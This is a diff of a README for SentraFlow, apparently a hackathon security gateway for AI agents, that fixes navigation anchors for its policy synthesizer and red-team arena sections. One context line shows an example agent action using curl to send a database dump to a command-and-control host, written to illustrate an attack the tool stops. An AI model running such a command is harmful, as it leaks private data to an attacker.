@@ -13,7 +13,7 @@
 
 <br />
 
-**[Live Dashboard Preview](#-real-time-cockpit) • [AI Policy Synthesizer](#-new-ai-policy-synthesizer-text-to-policy) • [Red Team Arena](#-new-red-team-vs-blue-team-adversarial-arena) • [Three-Phase Defense](#-three-phase-defense-pipeline) • [Quickstart](#-quickstart--local-development) • [Python SDK](#-agent-developer-sdk) • [OWASP Matrix](#-owasp-top-10-for-llm-coverage)**
+**[Live Dashboard Preview](#-real-time-cockpit) • [AI Policy Synthesizer](#ai-policy-synthesizer) • [Red Team Arena](#red-team-arena) • [Three-Phase Defense](#-three-phase-defense-pipeline) • [Quickstart](#-quickstart--local-development) • [Python SDK](#-agent-developer-sdk) • [OWASP Matrix](#-owasp-top-10-for-llm-coverage)**
 
 <br />
 
@@ -91,6 +91,7 @@ Agent Requests Action (e.g. EXECUTE curl https://c2.io/exfil -d @database.dump)
 
 ## 🏆 Hackathon Flagship Innovations
 
+<a id="ai-policy-synthesizer"></a>
 ### 1. ⚡ AI Policy Synthesizer (Natural Language → Zero-Trust Compiler)
 Security teams rarely speak fluent regex, and developers should never have to manually edit brittle security rule files while an attack is underway. 
 
@@ -101,6 +102,7 @@ SentraFlow's **AI Policy Synthesizer** uses **NVIDIA Nemotron 3.5 Bolt** (`nvidi
 * **Hot-Reload Kernel**: Injected into the active `PolicyEngine` at runtime in sub-second latency — no server restarts, no container redeployments, zero downtime.
 * **API Endpoint**: `POST /api/v1/policies/synthesize` & `GET /api/v1/policies/active`
 
+<a id="red-team-arena"></a>
 ### 2. ⚔️ Red Team vs. Blue Team Adversarial Arena
 A live battleground designed specifically for hackathon judges and security engineers to test SentraFlow against cutting-edge agent exploitation techniques:
 
